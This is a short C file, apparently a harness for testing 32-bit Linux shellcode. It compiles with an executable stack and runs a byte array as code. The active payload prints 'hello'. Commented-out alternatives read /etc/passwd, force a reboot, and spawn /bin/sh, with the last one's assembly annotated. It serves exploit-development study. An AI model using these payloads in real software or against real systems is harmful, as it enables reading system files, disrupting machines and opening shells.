// compile
// gcc test-shellcode-32.c -o test-shellcode-32 -fno-stack-protector -z execstack

// print hello
char code[] = 	"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
              	"\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";

// cat etc/passwd
//char code[] =	"\xeb\x1f\x59\x31\xc0\x31\xd2\x31\xdb\xb0\x0b\xb2\x00"\
 				"\x53\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3"\
				"\x52\x51\x53\x89\xe1\xcd\x80\xe8\xdc\xff\xff\xff\x2f"\
				"\x65\x74\x63\x2f\x2f\x70\x61\x73\x73\x77\x64";

// reboot
//char code[] =	"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"\
				"\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"\
				"\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"\
				"\x89\xe1\xb0\x0b\xcd\x80";

// call /bin/sh
// char code[]= \
    "\x31\xc0"             /* xorl    %eax,%eax              */\
    "\x50"                 /* pushl   %eax                   */\
    "\x68""//sh"           /* pushl   $0x68732f2f            */\
    "\x68""/bin"           /* pushl   $0x6e69622f            */\
    "\x89\xe3"             /* movl    %esp,%ebx              */\
    "\x50"                 /* pushl   %eax                   */\
    "\x53"                 /* pushl   %ebx                   */\
    "\x89\xe1"             /* movl    %esp,%ecx              */\
    "\x99"                 /* cdq                            */\
    "\xb0\x0b"             /* movb    $0x0b,%al              */\
    "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
     return 0;
}
